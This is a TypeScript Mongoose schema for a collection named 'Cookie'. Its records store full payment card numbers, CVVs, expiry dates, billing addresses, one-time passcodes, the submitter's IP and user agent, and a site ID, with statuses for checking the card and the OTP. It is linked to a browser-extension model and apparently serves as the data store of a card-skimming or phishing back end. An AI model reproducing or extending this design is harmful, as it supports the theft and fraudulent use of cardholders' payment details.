import { Schema, Document, model, Model } from "mongoose";
import { Extension, IExtensionDocument } from "./extension.model";
export enum EStatus {
  PENDING= 'pending',
  SUCCESS= 'success',
  FAILED= 'failed',
}
interface ICookie {
  orderId: number;
  cardNumber: string;
  expiredDate?: string;
  cvv: string;
  cardholderName?: string;
  type: string;
  firstName?: string;
  lastName?: string;
  country?: string;
  status?: string;
  city: string;
  street: string;
  state?: string;
  zipcode: string;
  otp?: string;
  ip: string;
  createdAt?: Date,
  updatedAt?: Date,
  siteId?: string;
  tags?: string[];
  userAgent?: string;
  done?: boolean;
  cardNumberStatus?: EStatus;
  otpStatus?: EStatus;
}
interface ICookieDocument extends Document, ICookie {

}
interface ICookieModel extends Model<ICookieDocument> {

}
const schema = new Schema<ICookie>({
  tags: {
    type: [String],
    default: [],
  },
  cardNumberStatus: {
    type: String,
    enum: EStatus,
    default: EStatus.PENDING,
  },
  otpStatus: {
    type: String,
    enum: EStatus,
    default: EStatus.PENDING,
  },
}, {
  timestamps: true,
  strict: false,
});
const Cookie = model<ICookie, ICookieModel>("Cookies", schema);
export {
  Cookie,
  ICookieDocument,
  ICookieModel,
  ICookie
}
export default Cookie;